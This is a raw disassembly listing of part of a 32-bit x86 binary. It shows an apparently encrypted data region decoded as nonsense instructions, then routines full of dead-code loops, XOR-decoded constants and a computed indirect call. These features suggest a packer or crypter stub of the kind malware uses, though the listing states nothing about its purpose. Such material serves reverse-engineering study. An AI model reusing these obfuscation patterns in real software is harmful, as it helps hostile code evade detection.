  40f310:	fadd   DWORD PTR [ebx+0x6e]
  40f313:	cmp    al,0xbf
  40f315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f316:	int    0x22
  40f318:	sar    BYTE PTR [ebp+eiz*4-0x39],cl
  40f31c:	cmp    al,0xa0
  40f31e:	jg     0x40f391
  40f320:	cmovp  ebp,DWORD PTR [eax]
  40f323:	jno    0x40f340
  40f325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f326:	mov    ?,WORD PTR [ebp+0x11]
  40f329:	push   cs
  40f32a:	xchg   esi,edx
  40f32c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f32d:	hlt    
  40f32e:	(bad)  
  40f32f:	test   DWORD PTR [ecx-0x62],0xe74fff57
  40f336:	daa    
  40f337:	rol    BYTE PTR [ecx-0x702a769b],cl
  40f33d:	test   eax,0x3ecb7bba
  40f342:	ficomp WORD PTR [esi+0x61]
  40f345:	clc    
  40f346:	sub    dl,ch
  40f348:	pushf  
  40f349:	push   ss
  40f34a:	push   cs
  40f34b:	cmp    ebx,DWORD PTR [ecx]
  40f34d:	adc    eax,0x8ff8bb9f
  40f352:	je     0x40f3c2
  40f354:	aaa    
  40f355:	xchg   ebp,eax
  40f356:	rol    ebx,0x3
  40f359:	out    0xb9,eax
  40f35b:	xchg   ecx,eax
  40f35c:	sbb    ebp,eax
  40f35e:	mov    ebp,0x477dae03
  40f363:	mov    DWORD PTR [eax],eax
  40f365:	pop    ecx
  40f366:	and    eax,DWORD PTR [ebx]
  40f368:	mov    al,0x3
  40f36a:	add    DWORD PTR ds:0xd55508c,0xb773441e
  40f374:	bound  ecx,QWORD PTR [eax-0x5c]
  40f377:	jmp    0xa944:0xe8938d1e
  40f37e:	ret    0x6c93
  40f381:	xchg   ecx,eax
  40f382:	lock mov dh,0xf1
  40f385:	dec    esp
  40f386:	mov    WORD PTR [edi+0x38],?
  40f389:	loop   0x40f39c
  40f38b:	pop    esi
  40f38c:	mov    bl,0x51
  40f38e:	ins    DWORD PTR es:[edi],dx
  40f38f:	stos   BYTE PTR es:[edi],al
  40f390:	out    dx,eax
  40f391:	jns    0x40f343
  40f393:	add    dh,bl
  40f395:	call   0x1db4:0xc954868c
  40f39c:	inc    esi
  40f39d:	fmul   QWORD PTR [ebx+0x66]
  40f3a0:	mov    eax,ds:0xf387c7c
  40f3a5:	das    
  40f3a6:	mov    ebx,0x4845fbf6
  40f3ab:	push   ecx
  40f3ac:	xchg   esi,eax
  40f3ad:	or     eax,0xcd78ff81
  40f3b2:	xor    DWORD PTR [esi],edi
  40f3b4:	cmc    
  40f3b5:	lea    edx,[ecx+eiz*4+0x6a]
  40f3b9:	in     al,0x40
  40f3bb:	call   0x3fb4:0x64348af8
  40f3c2:	and    DWORD PTR [ebx+0x177e25a4],edx
  40f3c8:	dec    bx
  40f3ca:	jle    0x40f3d4
  40f3cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3cd:	jecxz  0x40f3f2
  40f3cf:	jno    0x40f440
  40f3d1:	dec    ecx
  40f3d2:	sar    DWORD PTR [eax-0x10],cl
  40f3d5:	ins    DWORD PTR es:[edi],dx
  40f3d6:	pop    edi
  40f3d7:	push   edx
  40f3d8:	jmp    0x186e:0xd455e781
  40f3df:	lea    ebx,[ecx]
  40f3e1:	mov    cl,0x28
  40f3e3:	rol    DWORD PTR [ecx],1
  40f3e5:	fistp  QWORD PTR [edi+0x52a7827c]
  40f3eb:	jge    0x40f3c4
  40f3ed:	or     eax,0xaa4112cd
  40f3f2:	push   eax
  40f3f3:	cdq    
  40f3f4:	cmp    BYTE PTR [ebp+0xa],bl
  40f3f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3f8:	out    0xb1,eax
  40f3fa:	mov    WORD PTR [ebx-0x29],gs
  40f3fd:	fld    st(5)
  40f3ff:	push   ds
  40f400:	nop
  40f401:	jle    0x40f3d2
  40f403:	std    
  40f404:	imul   ecx,ebx,0xcd1997d1
  40f40a:	mov    al,BYTE PTR [eax+0x60]
  40f40d:	js     0x40f43c
  40f40f:	adc    eax,0x76432287
  40f414:	inc    ecx
  40f415:	push   0x69a10b89
  40f41a:	(bad)  
  40f41c:	and    DWORD PTR [esi],ebx
  40f41e:	mov    dl,0xbf
  40f420:	jbe    0x40f3c1
  40f422:	aas    
  40f423:	shr    BYTE PTR [edx-0x75acba24],cl
  40f429:	pop    esi
  40f42a:	loop   0x40f456
  40f42c:	cs sbb dl,ch
  40f42f:	test   BYTE PTR [edx],dh
  40f431:	xchg   BYTE PTR [eax+0x5506fd4b],dh
  40f437:	xor    eax,0x9a247882
  40f43c:	push   ebp
  40f43d:	dec    ecx
  40f43e:	push   0xaa224610
  40f443:	(bad)  
  40f444:	int3   
  40f445:	xchg   BYTE PTR [edi+esi*1-0x59],bh
  40f449:	pop    esi
  40f44a:	inc    ecx
  40f44b:	and    ebx,DWORD PTR [ebx+eax*8-0x2e]
  40f44f:	mov    ds:0xee1e73bf,eax
  40f454:	xor    al,0x84
  40f456:	lahf   
  40f457:	jnp    0x40f446
  40f459:	push   0x21
  40f45b:	add    ebp,ebx
  40f45d:	mov    esi,0x1cb92e97
  40f462:	lods   eax,DWORD PTR ds:[esi]
  40f463:	pushf  
  40f464:	xor    ebx,DWORD PTR [ebx-0x12ad4ccf]
  40f46a:	sbb    ch,BYTE PTR [esi]
  40f46c:	cmp    eax,0x7cd7422b
  40f471:	stc    
  40f472:	(bad)  
  40f473:	mov    ebp,0xdd0237bd
  40f478:	cmp    BYTE PTR [esi+0x1449a8c8],0x0
  40f47f:	jb     0x40f4b2
  40f481:	pop    es
  40f482:	fsub   QWORD PTR [ebx-0x4c]
  40f485:	jbe    0x40f457
  40f487:	hlt    
  40f488:	jno    0x40f4fb
  40f48a:	add    BYTE PTR [esi+0x2d],dh
  40f48d:	ins    DWORD PTR es:[edi],dx
  40f48e:	fiadd  DWORD PTR [edi+edi*8-0x2f]
  40f492:	xor    al,0x5b
  40f494:	xor    eax,0x4c3631da
  40f499:	repnz pop ebp
  40f49b:	jl     0x40f4e8
  40f49d:	cmc    
  40f49e:	popf   
  40f49f:	cmp    BYTE PTR [eax+0x69],ah
  40f4a2:	scas   eax,DWORD PTR es:[edi]
  40f4a3:	call   0xa7b414e4
  40f4a8:	cmp    eax,0x37fbef21
  40f4ad:	inc    eax
  40f4ae:	sbb    eax,0x884e9783
  40f4b3:	and    BYTE PTR [edx],ah
  40f4b5:	add    eax,0x14fa2f9
  40f4ba:	aas    
  40f4bb:	in     al,0x1d
  40f4bd:	sub    eax,0x62f0577c
  40f4c2:	fsubr  DWORD PTR [edi-0x40]
  40f4c5:	sbb    esi,DWORD PTR fs:[ecx+0x7682ade2]
  40f4cc:	jl     0x40f4c1
  40f4ce:	imul   ebp,edx,0xe
  40f4d1:	in     al,0xc4
  40f4d3:	mov    ch,BYTE PTR [si+0x31]
  40f4d7:	push   esi
  40f4d8:	sbb    al,BYTE PTR [eax+0x5f867a10]
  40f4de:	cwde   
  40f4df:	pop    es
  40f4e0:	or     eax,0x73ded3b8
  40f4e5:	clc    
  40f4e6:	inc    edx
  40f4e7:	dec    esi
  40f4e8:	mov    al,ds:0x133a40dd
  40f4ed:	fisttp WORD PTR [edi-0x3d]
  40f4f0:	push   ecx
  40f4f1:	pop    ss
  40f4f2:	inc    esp
  40f4f3:	inc    edx
  40f4f4:	std    
  40f4f5:	pop    edi
  40f4f6:	ret    0x26c
  40f4f9:	push   edi
  40f4fa:	jmp    0x40f4da
  40f4fc:	cmp    DWORD PTR ds:0x668d3bd6,edi
  40f502:	xchg   DWORD PTR [ecx],ebp
  40f504:	xor    esp,DWORD PTR [edi-0x7b]
  40f507:	inc    ebx
  40f508:	aas    
  40f509:	dec    esi
  40f50a:	mov    DWORD PTR [esi],esi
  40f50c:	mov    dl,0xc0
  40f50e:	scas   eax,DWORD PTR es:[edi]
  40f50f:	ja     0x40f51d
  40f511:	mov    DWORD PTR [eax+0x4],esi
  40f514:	inc    esp
  40f515:	sub    DWORD PTR [ecx-0x1f35993f],esp
  40f51b:	push   ss
  40f51c:	mov    esp,0x51b9b57b
  40f521:	out    dx,eax
  40f522:	pop    edi
  40f523:	enter  0x2bf8,0x6d
  40f527:	sbb    al,0xf4
  40f529:	fldenv [ebx-0x61752517]
  40f52f:	add    eax,0x9770d484
  40f534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f535:	fwait
  40f536:	or     eax,0x96a35d5f
  40f53b:	test   al,0x11
  40f53d:	mov    dl,0xcf
  40f53f:	push   edx
  40f540:	sbb    eax,0x364e13c4
  40f545:	mov    eax,ds:0x7ba66270
  40f54a:	outs   dx,DWORD PTR ds:[esi]
  40f54b:	ss clc 
  40f54d:	test   BYTE PTR [edx+0x6e],bl
  40f550:	es sub eax,0x94eb9853
  40f556:	pop    eax
  40f557:	jmp    0xe162eff0
  40f55c:	mov    ch,0x0
  40f55e:	jne    0x40f5ce
  40f560:	xchg   edx,eax
  40f561:	mov    al,0xc2
  40f563:	add    ch,dl
  40f565:	xchg   BYTE PTR [ebx+0x4b321ec5],al
  40f56b:	retf   0xd26d
  40f56e:	xlat   BYTE PTR ds:[ebx]
  40f56f:	xchg   edx,eax
  40f570:	in     eax,dx
  40f571:	leave  
  40f572:	pushf  
  40f573:	push   edx
  40f574:	cmp    DWORD PTR [edx],ebx
  40f576:	scas   al,BYTE PTR es:[edi]
  40f577:	out    dx,al
  40f578:	data16 hlt 
  40f57a:	mov    edx,0xe52aa61a
  40f57f:	in     al,0x5c
  40f581:	sti    
  40f582:	jo     0x40f5b6
  40f584:	(bad)  
  40f585:	out    dx,eax
  40f586:	cmc    
  40f587:	out    dx,al
  40f588:	pusha  
  40f589:	xchg   esi,eax
  40f58a:	lds    esp,FWORD PTR [eax-0x234a1209]
  40f590:	test   al,0x82
  40f592:	aam    0x9e
  40f594:	push   0x10d44cd7
  40f599:	jecxz  0x40f529
  40f59b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f59c:	lea    esp,[edi+0x34ae6370]
  40f5a2:	and    DWORD PTR [edx+ebx*8+0x5d],esi
  40f5a6:	lods   al,BYTE PTR ds:[esi]
  40f5a7:	(bad)  
  40f5a8:	in     eax,dx
  40f5a9:	int    0x70
  40f5ab:	cli    
  40f5ac:	sar    BYTE PTR [esi-0x4f],cl
  40f5af:	mov    BYTE PTR gs:[ebp+0x70],ch
  40f5b3:	out    0xba,eax
  40f5b5:	stos   DWORD PTR es:[edi],eax
  40f5b6:	imul   eax,DWORD PTR [esi+0x57],0xffffffa0
  40f5ba:	and    esi,DWORD PTR gs:[ebp+0x13]
  40f5be:	pop    ecx
  40f5bf:	or     ebp,edi
  40f5c1:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5c3:	push   ds
  40f5c4:	add    al,0x93
  40f5c6:	push   0x53
  40f5c8:	jecxz  0x40f5d2
  40f5ca:	cmp    al,0xdd
  40f5cc:	bound  ecx,QWORD PTR [eax+0x5]
  40f5cf:	retf   0xad6a
  40f5d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5d3:	aaa    
  40f5d4:	xor    BYTE PTR [esi-0x37111ea9],cl
  40f5da:	mov    edi,0x165b45dc
  40f5df:	aad    0x12
  40f5e1:	mov    DWORD PTR ds:0xfeade674,edx
  40f5e7:	add    eax,0xaca68eb1
  40f5ec:	inc    ecx
  40f5ed:	jecxz  0x40f612
  40f5ef:	and    eax,0x9e7f2161
  40f5f4:	out    0x12,al
  40f5f6:	loopne 0x40f5ae
  40f5f8:	ficomp DWORD PTR [ebx]
  40f5fa:	mov    al,ds:0x88198a25
  40f5ff:	repnz mov ds:0x4bf5e0e6,al
  40f605:	xchg   BYTE PTR [ecx],al
  40f607:	cmp    al,0xeb
  40f609:	xchg   edx,eax
  40f60a:	mov    edi,ds
  40f60c:	ror    bl,cl
  40f60e:	ficomp DWORD PTR [esi]
  40f610:	inc    ebx
  40f611:	imul   eax,DWORD PTR [edi],0x32
  40f614:	(bad)  [ebp+0x2807048]
  40f61a:	imul   esi,edx,0x129bc6ac
  40f620:	jae    0x40f5a3
  40f622:	dec    ebp
  40f623:	lock xchg BYTE PTR [ebx-0x392682a6],bl
  40f62a:	mov    ebp,0x4ead16f5
  40f62f:	lods   eax,DWORD PTR ds:[esi]
  40f630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f631:	fs test eax,0x509f6c0b
  40f637:	xchg   ebx,esi
  40f639:	xor    ebx,ebx
  40f63b:	push   esi
  40f63c:	mov    esi,ebx
  40f63e:	pop    ebx
  40f63f:	mov    edx,esi
  40f641:	add    ebx,0x1002
  40f647:	lea    eax,[ebp-0x18]
  40f64a:	add    edx,eax
  40f64c:	add    edx,0x5
  40f64f:	push   edx
  40f650:	inc    esi
  40f651:	pop    ecx
  40f652:	dec    ecx
  40f653:	xchg   ecx,eax
  40f654:	dec    eax
  40f655:	xchg   ecx,eax
  40f656:	dec    ecx
  40f657:	xchg   ecx,edx
  40f659:	dec    edx
  40f65a:	push   edx
  40f65b:	mov    edx,ebx
  40f65d:	pop    ebx
  40f65e:	dec    ebx
  40f65f:	call   DWORD PTR [ebx]
  40f661:	cmp    DWORD PTR [ebp+0x10],esi
  40f664:	je     0x40f685
  40f66a:	xchg   edx,eax
  40f66b:	push   0xc
  40f66d:	pop    ecx
  40f66e:	dec    ecx
  40f66f:	push   0x3
  40f671:	pop    ebx
  40f672:	inc    ebx
  40f673:	xchg   ebx,ecx
  40f675:	inc    ecx
  40f676:	sub    ebx,ecx
  40f678:	xchg   ebx,ecx
  40f67a:	dec    ecx
  40f67b:	dec    ecx
  40f67c:	mov    eax,DWORD PTR [ebp-0x1c]
  40f67f:	imul   eax,ecx
  40f682:	add    esp,eax
  40f684:	xchg   edx,eax
  40f685:	push   eax
  40f686:	xor    ebx,ebx
  40f688:	mov    edx,esp
  40f68a:	dec    edx
  40f68b:	inc    ebx
  40f68c:	add    ebx,DWORD PTR [edx+ebx*1]
  40f68f:	dec    ebx
  40f690:	xor    edx,edx
  40f692:	add    DWORD PTR [ebp-0x10],ebx
  40f695:	pop    ebx
  40f696:	mov    eax,DWORD PTR [ebp-0x10]
  40f699:	pop    edi
  40f69a:	pop    esi
  40f69b:	pop    ebx
  40f69c:	leave  
  40f69d:	ret    0x10
  40f6a0:	push   ebp
  40f6a1:	mov    ebp,esp
  40f6a3:	push   ecx
  40f6a4:	mov    DWORD PTR [ebp-0x4],0xf89c85bd
  40f6ab:	xor    DWORD PTR ds:0x428eb1,0x6807
  40f6b5:	mov    eax,DWORD PTR [ebp-0x4]
  40f6b8:	mov    edx,DWORD PTR [ebp+0x10]
  40f6bb:	mov    ecx,0x75108b1
  40f6c0:	xor    eax,ecx
  40f6c2:	add    eax,0x3272f8
  40f6c7:	mov    DWORD PTR [edx],eax
  40f6c9:	mov    eax,DWORD PTR [ebp+0xc]
  40f6cc:	xor    eax,ecx
  40f6ce:	or     DWORD PTR ds:0x428e95,0x4274
  40f6d8:	push   esi
  40f6d9:	xor    edx,DWORD PTR ds:0x428e25
  40f6df:	mov    esi,DWORD PTR [ebp+0x10]
  40f6e2:	mov    edx,0x3272f8
  40f6e7:	sub    DWORD PTR ds:0x428e35,0x428e89
  40f6f1:	add    eax,edx
  40f6f3:	mov    DWORD PTR [esi+0x4],eax
  40f6f6:	mov    eax,DWORD PTR [ebp+0x14]
  40f6f9:	sub    DWORD PTR ds:0x428e6d,0x71ec
  40f703:	mov    esi,DWORD PTR [ebp+0x10]
  40f706:	xor    DWORD PTR ds:0x428e75,0xbd4
  40f710:	mov    DWORD PTR [esi+0x8],eax
  40f713:	mov    eax,DWORD PTR [ebp+0x18]
  40f716:	mov    esi,DWORD PTR [ebp+0x10]
  40f719:	sub    DWORD PTR ds:0x428e31,0x4173
  40f723:	mov    DWORD PTR [esi+0xc],eax
  40f726:	add    esi,0x59ec
  40f72c:	mov    eax,DWORD PTR [ebp+0x1c]
  40f72f:	mov    esi,DWORD PTR [ebp+0x10]
  40f732:	mov    DWORD PTR [esi+0x10],eax
  40f735:	mov    eax,DWORD PTR [ebp+0x8]
  40f738:	xor    eax,ecx
  40f73a:	add    eax,edx
  40f73c:	pop    esi
  40f73d:	leave  
  40f73e:	ret    0x18
  40f741:	push   ebp
  40f742:	mov    ebp,esp
  40f744:	sub    esp,0x9c
  40f74a:	mov    ecx,DWORD PTR [ebp+0x8]
  40f74d:	sbb    DWORD PTR ds:0x428e9d,edx
  40f753:	mov    eax,0x8a9c
  40f758:	sbb    DWORD PTR ds:0x428ed1,0x428ec1
  40f762:	xor    ax,WORD PTR [ecx+0x20]
  40f766:	and    DWORD PTR ds:0x428e65,ebx
  40f76c:	mov    ecx,0x3b5e
  40f771:	add    ax,cx
  40f774:	movzx  eax,ax
  40f777:	xor    ecx,DWORD PTR ds:0x428e89
  40f77d:	mov    DWORD PTR [ebp-0x10],eax
  40f780:	mov    BYTE PTR [ebp-0x1],0x7c
  40f784:	and    DWORD PTR ds:0x428e9d,0x0
  40f78e:	mov    ecx,DWORD PTR ds:0x428e9d
  40f794:	inc    ecx
  40f795:	mov    DWORD PTR ds:0x428e9d,ecx
  40f79b:	cmp    DWORD PTR ds:0x428e9d,0x25
  40f7a2:	ja     0x40f7ce
  40f7a8:	jmp    0x40f7c1
  40f7ad:	push   0x762d
  40f7b2:	push   DWORD PTR [ebp-0x1c]
  40f7b5:	push   DWORD PTR [ebp-0x10]
  40f7b8:	push   DWORD PTR [ebp-0x1c]
  40f7bb:	call   DWORD PTR ds:0x42ca3c
  40f7c1:	cmp    DWORD PTR ds:0x428e9d,0x1d
  40f7c8:	jb     0x40f78e
  40f7ce:	lea    eax,[ebp-0x1]
  40f7d1:	mov    DWORD PTR [ebp-0xc],eax
  40f7d4:	mov    DWORD PTR ds:0x428e65,0x1c
  40f7de:	cmp    DWORD PTR ds:0x428e65,0x0
  40f7e5:	je     0x40f82d
  40f7eb:	cmp    DWORD PTR ds:0x428e65,0x22
  40f7f2:	jle    0x40f82d
  40f7f8:	jmp    0x40f819
  40f7fd:	push   0x5d70
  40f802:	push   DWORD PTR [ebp-0x24]
  40f805:	push   DWORD PTR [ebp-0x20]
  40f808:	push   DWORD PTR [ebp-0x28]
  40f80b:	push   0x428104
  40f810:	push   DWORD PTR [ebp-0x24]
  40f813:	call   DWORD PTR ds:0x42ca10
  40f819:	xor    ecx,ecx
  40f81b:	or     ecx,DWORD PTR ds:0x428e65
  40f821:	dec    ecx
  40f822:	mov    DWORD PTR ds:0x428e65,ecx
  40f828:	jmp    0x40f7de
  40f82d:	mov    al,BYTE PTR [ebp-0x1]
  40f830:	add    DWORD PTR ds:0x428e95,edi
  40f836:	mov    ecx,DWORD PTR [ebp-0xc]
  40f839:	xor    al,0x80
  40f83b:	sub    DWORD PTR ds:0x428ebd,0x428e99
  40f845:	add    al,0x5
  40f847:	sbb    DWORD PTR ds:0x428e29,0x428ead
  40f851:	mov    BYTE PTR [ecx],al
  40f853:	mov    DWORD PTR ds:0x428eb1,0x18
  40f85d:	cmp    DWORD PTR ds:0x428eb1,0x0
  40f864:	je     0x40f8ba
  40f86a:	cmp    DWORD PTR ds:0x428eb1,0xc
  40f871:	jl     0x40f8ba
  40f877:	jmp    0x40f88c
  40f87c:	push   0x428009
  40f881:	push   DWORD PTR [ebp-0x28]
  40f884:	push   0x0
  40f886:	call   DWORD PTR ds:0x42ca4c
  40f88c:	cmp    DWORD PTR ds:0x428eb1,0xd
  40f893:	jne    0x40f8a6
  40f899:	mov    ecx,DWORD PTR ds:0x428eb1
  40f89f:	dec    ecx
  40f8a0:	mov    DWORD PTR ds:0x428eb1,ecx
  40f8a6:	xor    ecx,ecx
  40f8a8:	add    ecx,DWORD PTR ds:0x428eb1
  40f8ae:	dec    ecx
  40f8af:	mov    DWORD PTR ds:0x428eb1,ecx
  40f8b5:	jmp    0x40f85d
  40f8ba:	mov    DWORD PTR [ebp-0x18],0xf89c85b9
  40f8c1:	push   ebx
  40f8c2:	mov    DWORD PTR ds:0x428e59,0x10
  40f8cc:	cmp    DWORD PTR ds:0x428e59,0x0
  40f8d3:	je     0x40f909
  40f8d9:	cmp    DWORD PTR ds:0x428e59,0x12
  40f8e0:	jg     0x40f909
  40f8e6:	jmp    0x40f8f6
  40f8eb:	push   0x21fb
  40f8f0:	call   DWORD PTR ds:0x42ca50
  40f8f6:	xor    eax,eax
  40f8f8:	or     eax,DWORD PTR ds:0x428e59
  40f8fe:	dec    eax
  40f8ff:	mov    ds:0x428e59,eax
  40f904:	jmp    0x40f8cc
  40f909:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  40f910:	mov    ecx,DWORD PTR [ebp-0x18]
  40f913:	push   esi
  40f914:	mov    eax,0x75108b1
  40f919:	and    DWORD PTR ds:0x428e8d,0x6e27
  40f923:	xor    ecx,eax
  40f925:	or     esi,DWORD PTR ds:0x428e41
  40f92b:	mov    esi,0x3272f8
  40f930:	sbb    DWORD PTR ds:0x428e65,0x3911
  40f93a:	push   edi
  40f93b:	add    ecx,esi
  40f93d:	jmp    0x40f957
  40f942:	mov    dl,BYTE PTR [ebp-0x1]
  40f945:	mov    DWORD PTR ds:0x428ea5,0x4ad2
  40f94f:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40f956:	inc    ecx
  40f957:	cmp    ecx,0x40
  40f95a:	mov    DWORD PTR ds:0x428ec9,0x10ec
  40f964:	jb     0x40f942
  40f96a:	not    edx
  40f96c:	mov    edx,DWORD PTR [ebp-0x18]
  40f96f:	or     DWORD PTR ds:0x428e95,0x5092
  40f979:	xor    edx,eax
  40f97b:	sbb    DWORD PTR ds:0x428e7d,0x7f40
  40f985:	add    edx,esi
  40f987:	mov    DWORD PTR ds:0x428e35,0x3958
  40f991:	jmp    0x40fa14
  40f996:	sbb    ecx,DWORD PTR ds:0x428e6d
  40f99c:	mov    edi,DWORD PTR [ebp+0x8]
  40f99f:	sub    DWORD PTR ds:0x428e2d,0x7feb
  40f9a9:	mov    ecx,0x8a9c
  40f9ae:	sbb    DWORD PTR ds:0x428e25,0x428e91
  40f9b8:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40f9bd:	or     DWORD PTR ds:0x428e2d,0x498b
  40f9c7:	mov    edi,0x3b5e
  40f9cc:	or     DWORD PTR ds:0x428e49,0x428e35
  40f9d6:	add    cx,di
  40f9d9:	movzx  ecx,cx
  40f9dc:	mov    DWORD PTR [ebp-0xc],ecx
  40f9df:	and    DWORD PTR ds:0x428ec9,ecx
  40f9e5:	mov    ecx,DWORD PTR [ebp+0x8]
  40f9e8:	movzx  ecx,WORD PTR [ecx+edx*4]
  40f9ec:	add    DWORD PTR ds:0x428e71,0x1e66
  40f9f6:	xor    ecx,0x8a9c
  40f9fc:	add    ecx,edi
  40f9fe:	inc    edi
  40f9ff:	mov    edi,DWORD PTR [ebp-0xc]
  40fa02:	mov    DWORD PTR ds:0x428e49,0x2418
  40fa0c:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40fa13:	inc    edx
  40fa14:	mov    DWORD PTR ds:0x428e81,ecx
  40fa1a:	mov    ecx,DWORD PTR [ebp-0x10]
  40fa1d:	mov    DWORD PTR ds:0x428e61,0x6126
  40fa27:	cmp    edx,ecx
  40fa29:	jne    0x40f996
  40fa2f:	mov    ecx,DWORD PTR [ebp-0x18]
  40fa32:	and    DWORD PTR ds:0x428ec9,0x0
  40fa3c:	jmp    0x40fa50
  40fa41:	xor    edi,edi
  40fa43:	or     edi,DWORD PTR ds:0x428ec9
  40fa49:	inc    edi
  40fa4a:	mov    DWORD PTR ds:0x428ec9,edi
  40fa50:	cmp    DWORD PTR ds:0x428ec9,0x19
  40fa57:	jae    0x40fa87
  40fa5d:	cmp    DWORD PTR ds:0x428ec9,0x28
  40fa64:	jbe    0x40fa87
  40fa6a:	jmp    0x40fa82
  40fa6f:	push   DWORD PTR [ebp-0x20]
  40fa72:	push   0x428104
  40fa77:	push   0x428eb9
  40fa7c:	call   DWORD PTR ds:0x42ca54
  40fa82:	jmp    0x40fa41
  40fa87:	mov    edx,DWORD PTR [ebp+0x10]
  40fa8a:	mov    edi,DWORD PTR ds:0x428e55
  40fa90:	sub    DWORD PTR ds:0x428e75,edi
  40fa96:	xor    ecx,eax
  40fa98:	add    ecx,esi
  40fa9a:	neg    edi
  40fa9c:	mov    DWORD PTR [edx],ecx
  40fa9e:	and    DWORD PTR ds:0x428e49,0x0
  40faa8:	jmp    0x40faba
  40faad:	mov    ecx,DWORD PTR ds:0x428e49
  40fab3:	inc    ecx
  40fab4:	mov    DWORD PTR ds:0x428e49,ecx
  40faba:	cmp    DWORD PTR ds:0x428e49,0x1d
  40fac1:	jae    0x40faf7
  40fac7:	cmp    DWORD PTR ds:0x428e49,0x21
  40face:	jb     0x40faf7
  40fad4:	jmp    0x40faf2
  40fad9:	push   DWORD PTR [ebp-0x14]
  40fadc:	push   DWORD PTR [ebp-0x28]
  40fadf:	push   0x4b8c
  40fae4:	push   DWORD PTR [ebp-0x18]
  40fae7:	push   0x428e9d
  40faec:	call   DWORD PTR ds:0x42ca14
  40faf2:	jmp    0x40faad
  40faf7:	mov    ecx,DWORD PTR [ebp-0x18]
  40fafa:	xor    ecx,eax
  40fafc:	add    ecx,esi
  40fafe:	neg    edi
  40fb00:	mov    DWORD PTR [ebp-0xc],ecx
  40fb03:	or     DWORD PTR ds:0x428e59,edx
  40fb09:	mov    DWORD PTR [ebp+0x8],0xf89c85b9
  40fb10:	movzx  edi,BYTE PTR ds:0x428e35
  40fb17:	or     edi,DWORD PTR ds:0x428ec5
  40fb1d:	mov    DWORD PTR ds:0x428e35,edi
  40fb23:	mov    DWORD PTR [ebp-0x14],0xf89c85a9
  40fb2a:	and    DWORD PTR ds:0x428e81,0x0
  40fb34:	jmp    0x40fb46
  40fb39:	mov    ecx,DWORD PTR ds:0x428e81
  40fb3f:	inc    ecx
  40fb40:	mov    DWORD PTR ds:0x428e81,ecx
  40fb46:	cmp    DWORD PTR ds:0x428e81,0x1b
  40fb4d:	jae    0x40fb94
  40fb53:	cmp    DWORD PTR ds:0x428e81,0xa
  40fb5a:	jbe    0x40fb94
  40fb60:	jmp    0x40fb75
  40fb65:	push   0x3736
  40fb6a:	push   0x7077
  40fb6f:	call   DWORD PTR ds:0x42ca18
  40fb75:	cmp    DWORD PTR ds:0x428e81,0x9
  40fb7c:	jne    0x40fb8f
  40fb82:	mov    ecx,DWORD PTR ds:0x428e81
  40fb88:	inc    ecx
  40fb89:	mov    DWORD PTR ds:0x428e81,ecx
  40fb8f:	jmp    0x40fb39
  40fb94:	mov    DWORD PTR [ebp-0x10],0xf89c95b9
  40fb9b:	and    DWORD PTR ds:0x428e35,0x0
  40fba5:	jmp    0x40fbb7
  40fbaa:	mov    ecx,DWORD PTR ds:0x428e35
  40fbb0:	inc    ecx
  40fbb1:	mov    DWORD PTR ds:0x428e35,ecx
  40fbb7:	cmp    DWORD PTR ds:0x428e35,0x11
  40fbbe:	jae    0x40fc0b
  40fbc4:	cmp    DWORD PTR ds:0x428e35,0x5
  40fbcb:	jge    0x40fc0b
  40fbd1:	jmp    0x40fbec
  40fbd6:	push   DWORD PTR [ebp-0xc]
  40fbd9:	push   DWORD PTR [ebp-0x18]
  40fbdc:	push   0x1f27
  40fbe1:	push   0x4d22
  40fbe6:	call   DWORD PTR ds:0x42ca58
  40fbec:	cmp    DWORD PTR ds:0x428e35,0x4
  40fbf3:	jne    0x40fc06
  40fbf9:	mov    ecx,DWORD PTR ds:0x428e35
  40fbff:	inc    ecx
  40fc00:	mov    DWORD PTR ds:0x428e35,ecx
  40fc06:	jmp    0x40fbaa
  40fc0b:	mov    ecx,DWORD PTR [ebp-0x14]
  40fc0e:	xor    edi,edi
  40fc10:	add    edi,DWORD PTR ds:0x428e95
  40fc16:	xor    DWORD PTR ds:0x428e41,edi
  40fc1c:	mov    DWORD PTR [ebp+0x8],ecx
  40fc1f:	adc    DWORD PTR ds:0x428e31,ebx
  40fc25:	mov    ecx,DWORD PTR [ebp+0x8]
  40fc28:	adc    DWORD PTR ds:0x428e39,0x50fd
  40fc32:	xor    ecx,eax
  40fc34:	or     DWORD PTR ds:0x428e49,0x428e31
  40fc3e:	add    ecx,esi
  40fc40:	mov    ecx,0xf641bea
  40fc45:	mov    edi,0x15c3
  40fc4a:	mov    edi,0x5a1eade
  40fc4f:	je     0x412616
  40fc55:	add    edx,ebx
  40fc57:	mov    edx,DWORD PTR [ebp+0x8]
  40fc5a:	and    DWORD PTR ds:0x428eb5,0x428e6d
  40fc64:	mov    ebx,DWORD PTR [ebp-0x8]
  40fc67:	xor    edx,eax
  40fc69:	adc    DWORD PTR ds:0x428e49,0x78c3
  40fc73:	xor    ebx,eax
  40fc75:	sub    edx,ebx
  40fc77:	not    DWORD PTR ds:0x428e65
  40fc7d:	sub    edx,esi
  40fc7f:	xor    edx,eax
  40fc81:	sub    DWORD PTR ds:0x428ec1,ebx
  40fc87:	mov    DWORD PTR [ebp+0x8],edx
  40fc8a:	mov    DWORD PTR ds:0x428e81,0x18
  40fc94:	cmp    DWORD PTR ds:0x428e81,0x0
  40fc9b:	je     0x40fcef
  40fca1:	cmp    DWORD PTR ds:0x428e81,0x9
  40fca8:	jg     0x40fcef
  40fcae:	jmp    0x40fcc1
  40fcb3:	push   DWORD PTR [ebp-0x1c]
  40fcb6:	push   0x8c8f
  40fcbb:	call   DWORD PTR ds:0x42ca1c
  40fcc1:	cmp    DWORD PTR ds:0x428e81,0xa
  40fcc8:	jne    0x40fcdd
  40fcce:	xor    edx,edx
